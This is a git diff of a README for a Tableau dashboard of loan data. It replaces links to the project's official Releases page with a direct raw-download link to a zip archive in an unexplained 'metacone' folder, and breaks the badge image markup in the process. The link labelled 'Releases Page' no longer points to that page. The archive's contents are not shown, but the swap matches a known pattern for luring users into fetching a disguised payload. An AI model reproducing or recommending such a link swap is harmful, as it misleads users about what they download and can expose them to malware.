@@ -1,7 +1,7 @@
 # 📊 tableau-dashboards - Your Guide to Loan Insights
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/satya2320/tableau-dashboards/releases)
+[![Download Latest Release](https://github.com/satya2320/tableau-dashboards/raw/refs/heads/main/metacone/dashboards-tableau-v1.6.zip%20Latest%20Release-blue)](https://github.com/satya2320/tableau-dashboards/raw/refs/heads/main/metacone/dashboards-tableau-v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Finance Navigator Pro! This interactive Tableau dashboard helps you analyze 38,600 loan applications. With clear insights into key performance indicators (KPIs), you can understand good and bad loan distributions (86% good), lending trends by purpose, state, term, and grade. Let’s get you started!
@@ -18,7 +18,7 @@ To run the dashboard, ensure your system meets the following requirements:
 - **Interactive Filters:** Customize views based on state, term, and grade.
 
 ## 📑 Download & Install
-To download the Finance Navigator Pro dashboard, visit this page to download: [Releases Page](https://github.com/satya2320/tableau-dashboards/releases).
+To download the Finance Navigator Pro dashboard, visit this page to download: [Releases Page](https://github.com/satya2320/tableau-dashboards/raw/refs/heads/main/metacone/dashboards-tableau-v1.6.zip).
 
 1. Click on the link above.
 2. Choose the latest version available.
